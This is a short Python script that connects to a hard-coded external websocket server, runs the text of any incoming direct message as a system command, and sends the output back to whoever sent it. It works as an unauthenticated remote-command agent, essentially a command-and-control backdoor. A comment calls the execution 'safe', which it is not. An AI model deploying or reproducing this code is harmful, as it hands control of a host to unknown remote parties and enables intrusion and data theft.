import asyncio
import websockets
import random
import subprocess
import re

SERVER_URL = "wss://websocket-server-no6j.onrender.com"
RECEIVER_NAME = f"receiver_{random.randint(1000, 9999)}"

async def listen():
    async with websockets.connect(SERVER_URL) as ws:
        print(f"[System] Connected as {RECEIVER_NAME}")
        await ws.send(f"/user {RECEIVER_NAME}")

        while True:
            try:
                msg = await ws.recv()
                print(msg)

                if msg.startswith("[DM from "):
                    # Extract sender username using regex
                    match = re.search(r"\[DM from ([^\]]+)\]", msg)
                    if not match:
                        print("[Error] Failed to parse sender username")
                        continue
                    sender = match.group(1)

                    # Extract command after the first ']:'
                    command = msg.split("]:", 1)[1].strip()
                    print(f"[Command from {sender}] {command}")

                    # Run the command safely
                    try:
                        output = subprocess.check_output(
                            command,
                            shell=False,
                            stderr=subprocess.STDOUT,
                            text=True,
                            timeout=10
                        )
                    except subprocess.CalledProcessError as e:
                        output = f"[Command Failed]\n{e.output.strip()}"
                    except Exception as ex:
                        output = f"[Error] {str(ex)}"

                    # Limit output length
                    output = output.strip()
                    if not output:
                        output = "[No output]"
                    elif len(output) > 1500:
                        output = output[:1500] + "\n...[truncated]"

                    # Send output back to sender
                    reply = f"/to {sender} [Output from {RECEIVER_NAME}]\n{output}"
                    await ws.send(reply)

            except websockets.exceptions.ConnectionClosed:
                print("[System] Disconnected from server.")
                break
            except Exception as e:
                print(f"[Error] {e}")
                continue

if __name__ == "__main__":
    try:
        asyncio.run(listen())
    except KeyboardInterrupt:
        print("\n[System] Closed by user.")
